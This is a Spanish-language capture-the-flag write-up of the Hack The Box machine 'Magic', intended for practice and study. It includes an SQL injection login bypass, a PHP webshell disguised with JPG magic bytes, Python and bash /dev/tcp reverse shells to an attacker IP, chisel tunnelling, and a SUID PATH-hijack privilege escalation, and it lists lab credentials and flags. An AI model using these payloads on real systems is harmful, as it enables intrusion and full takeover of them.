---
tags:
  - CTF
  - OSCP
  - linux
  - estado/completo
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/241
dificultad: Media
ip: 10.10.10.185
os: Linux
relacionados:
  - "[[SQL Injection (SQLi)|SQLI]]"
  - "[[Port Forwarding]]"
  - "[[Magic Bytes]]"
  - "[[Doble extension]]"
  - "[[PATH Hijacking]]"
---
# HackTheBox - Magic

## Reconocimiento

### Escaneo de Red con Nmap

Para comenzar mi análisis, realicé un escaneo de puertos exhaustivo sobre la máquina objetivo. Utilicé `nmap` para identificar todos los puertos abiertos y luego lancé un segundo escaneo más detallado sobre estos para obtener información sobre los servicios y versiones.

```bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 00_Reconnaissance/allports
nmap -sCV -p22,80 $(cat ip) -oN 00_Reconnaissance/sCV
```

Los resultados mostraron dos servicios principales:
- **Puerto 22/tcp:** OpenSSH
- **Puerto 80/tcp:** Apache httpd

### Enumeración del Servidor Web

Al navegar con mi explorador a `http://10.10.10.185`, me encontré con una galería de imágenes. En el pie de página, un enlace "Login" me dirigió a un formulario de inicio de sesión. Mis intentos iniciales con credenciales comunes como `admin:admin` no tuvieron éxito.

Para descubrir más sobre la estructura del sitio web, lancé `gobuster` para enumerar directorios y archivos.
```Bash
gobuster dir -u http://10.10.10.185 -w /usr/share/dirb/wordlists/common.txt -x php
```

`gobuster` reveló la existencia de `upload.php`, que me redirigía al login, y un directorio `/images`.

> [!INFO] Directorio de subida potencial
> 
> Decidí profundizar en el directorio /images con otro escaneo de gobuster, lo que me llevó a descubrir la ruta /images/uploads. Anoté esta ruta, ya que parecía ser el destino de los archivos subidos.


---

## Análisis de vulnerabilidades

### Inyección SQL en el formulario de Login

Ante un formulario de login y sin credenciales válidas, mi primer instinto fue probar una inyección SQL para eludir la autenticación. Introduje una carga útil clásica en el campo de usuario.

La consulta SQL subyacente probablemente se asemeja a algo como:
```sql
SELECT * FROM users WHERE username = '[INPUT_USUARIO]' AND password = '[INPUT_PASSWORD]'

Al inyectar ' or 1=1-- - como nombre de usuario, la consulta se transforma en:

SELECT * FROM users WHERE username = '' or 1=1-- -' AND password = '...'
```

El `-- -` comenta el resto de la consulta, y la condición `1=1` siempre es verdadera, lo que hace que el `WHERE` se evalúe como cierto y me conceda acceso sin necesidad de una contraseña válida.

### Subida de archivos con validación débil

Una vez dentro, me encontré en la página `upload.php`. Mi objetivo era subir un webshell para obtener ejecución de comandos. Sin embargo, mi primer intento de subir un archivo `shell.php` fue rechazado. Esto indicaba que existía una validación del tipo de archivo.

> [!WARNING] Bypass de Doble Extensión y Magic Bytes
> 
> La aplicación parecía estar validando los archivos de dos maneras:
> 
> 1. **Validación de extensión:** Aceptaba únicamente archivos con extensiones `.jpg`, `.jpeg` o `.png`. Sin embargo, algunos servidores Apache mal configurados pueden ser vulnerables a un bypass de doble extensión. Si la configuración no ancla la validación al final del nombre del archivo (usando `$` en la expresión regular), un archivo llamado `shell.php.jpg` será tratado como un script PHP por el manejador del servidor.
>     
> 2. **Validación de contenido (Magic Bytes):** Mi intento con `shell.php.jpg` también falló, lo que me hizo sospechar de una segunda capa de validación que inspecciona el contenido del archivo. Funciones como `exif_imagetype` en PHP leen los primeros bytes de un archivo (sus "magic bytes") para determinar su tipo real. Para eludir esto, necesitaría añadir la cabecera de un archivo JPG al principio de mi webshell.
>     


---

## Explotación de vulnerabilidades

### Obtención de acceso inicial (Foothold) 

Para empezar, exploté la vulnerabilidad de **inyección SQL** en el login utilizando la carga útil `' or 1=1-- -` en el campo de usuario, lo que me dio acceso directo a `upload.php`.

Luego, preparé mi webshell para eludir las validaciones. Primero, busqué los magic bytes de un archivo JPG (`FF D8 FF DB`). Usé `xxd` para crear un archivo con esta cabecera y luego le añadí mi código PHP.
```Bash
# Crear el archivo con los magic bytes de JPG
echo 'FFD8FFDB' | xxd -r -p > webshell.php.jpg

# Añadir el webshell PHP al final del archivo
echo '<?=`$_GET[0]`?>' >> webshell.php.jpg
```

Esta vez, la subida del archivo `webshell.php.jpg` fue exitosa. Sabiendo por mi reconocimiento previo que los archivos se alojaban en `/images/uploads`, navegué a la URL para ejecutar comandos:
```Bash
curl "http://10.10.10.185/images/uploads/webshell.php.jpg?0=whoami"
```

La respuesta fue `www-data`. ¡Había conseguido ejecución remota de comandos!

Para obtener una shell interactiva, primero verifiqué la disponibilidad de Python con `which python3` y, al confirmarla, usé un one-liner para establecer una reverse shell hacia mi máquina.
```Bash
# En mi máquina de atacante
nc -lvnp 4444

# A través del webshell en el navegador/curl (URL codificado)
http://10.10.10.185/images/uploads/webshell.php.jpg?0=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.6%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

Una vez con la shell, la mejoré a una TTY completamente interactiva.
```Bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Movimiento Lateral 

Al enumerar el sistema como `www-data`, encontré un archivo de configuración interesante en `/var/www/Magic/db.php5`.
```Bash
cat /var/www/Magic/db.php5
```

El archivo contenía credenciales para una base de datos MySQL: `theseus:iamkingtheseus`.

Intenté usar esta contraseña para cambiar al usuario `theseus` con `su`, pero falló. El servicio MySQL no estaba expuesto en la red, y el cliente `mysql` no estaba instalado en la máquina víctima.

#### Opción 1: MySQL con Chisel

> [!TIP] Port Forwarding con Chisel
> 
> Para acceder a la base de datos, necesitaba reenviar el puerto 3306 de la máquina víctima a mi máquina. Utilicé Chisel para esto.

1. Subí el binario de `chisel` a la máquina víctima desde mi servidor HTTP local.
    ```Bash
    # En mi máquina (directorio con chisel)
    python3 -m http.server 8080
    
    # En la máquina víctima (/tmp)
    wget http://10.10.14.7:8080/chisel
    chmod +x chisel
    ```
    
2. Inicié el servidor `chisel` en mi máquina para aceptar la conexión inversa.
    ```Bash
    # En mi máquina
    ./chisel server -p 8000 --reverse
    ```
    
3. Ejecuté el cliente `chisel` en la víctima para conectar y reenviar el puerto.
    ```Bash
    # En la máquina víctima
    ./chisel client 10.10.14.7:8000 R:3306:127.0.0.1:3306 &
    ```
    
Con el túnel establecido, me conecté a la base de datos desde mi máquina local usando las credenciales encontradas.
```Bash
mysql -h 127.0.0.1 -P 3306 -u theseus -piamkingtheseus
```

Dentro de la base de datos `Magic`, consulté la tabla `login` y encontré la contraseña del usuario `admin` en texto plano: `Th3s3usW4sK1ng`.
```SQL
USE Magic;
SHOW TABLES;
SELECT * FROM login;
```

Esta contraseña sí funcionó para el usuario `theseus`.
```Bash
su theseus
# Contraseña: Th3s3usW4sK1ng
cat /home/theseus/user.txt
```

#### Opción 2: MySQL Dump

Uso `mysqldump` con los datos obtenidos anteriormente para evitar tener que usar Chisel y hacer el portforwarding. 
```SQL
mysqldump -u theseus -p Magic
#password: Th3s3usW4sK1ng
```

Obtengo la contraseña del usuario theseus con mayor facilidad. 


---

## Escalada de privilegios

### Abuso de SUID y Path Hijacking 

Una vez como `theseus`, mi siguiente paso fue buscar vectores de escalada de privilegios. Me centré en archivos con el bit **SUID** activado.
```Bash
find / -perm -4000 -type f 2>/dev/null
```

Un binario llamó mi atención: `/bin/sysinfo`. Al ejecutarlo, mostraba información del sistema. Lo interesante es que un binario con SUID se ejecuta con los privilegios del propietario del archivo, en este caso, `root`.

Para entender su funcionamiento, usé el comando `strings`.
```Bash
strings /bin/sysinfo
```

> [!DANGER] Vulnerabilidad de Path Hijacking
> 
> El análisis con strings reveló que /bin/sysinfo llamaba a comandos del sistema como cat, free, lshw y fdisk sin usar sus rutas absolutas (ej: cat en lugar de /bin/cat). Esto abre la puerta a un ataque de Path Hijacking. Puedo modificar la variable de entorno $PATH para que apunte primero a un directorio bajo mi control (como /tmp). Luego, creo un script malicioso con el mismo nombre que uno de los comandos llamados (ej: cat) en ese directorio. Cuando sysinfo (ejecutándose como root) intente llamar a cat, ejecutará mi script malicioso con privilegios de root.

Seguí estos pasos para explotar la vulnerabilidad:

1. Añadí `/tmp` al principio de mi variable `$PATH`.
    ```Bash
    export PATH=/tmp:$PATH
    echo $PATH
    ```
    
2. Creé un script malicioso llamado `cat` en `/tmp` que me daría una reverse shell. Lo hice ejecutable.
    ```Bash
    echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.7/5555 0>&1'" > /tmp/cat
    chmod +x /tmp/cat
    ```
    
    _Nota: Podría haber usado `socat` o cualquier otro método para la shell._
    
3. Puse un listener en mi máquina.
    ```Bash
    nc -lvnp 5555
    ```
    
4. Ejecuté el binario SUID.
    ```Bash
    /bin/sysinfo
    ```
    

Inmediatamente, recibí una conexión en mi listener con una shell de `root`. ¡Escalada de privilegios completada!
```Bash
whoami
# root
cat /root/root.txt
```


___

## Bandera(s)

> [!FLAG] `flag{user}`
> 6d575a21239830534522d1c6a59c04fd
^bandera

> [!FLAG] `flag{root}`
> 99a7a733bda0e3845ce5f3ffc12d43d2
^bandera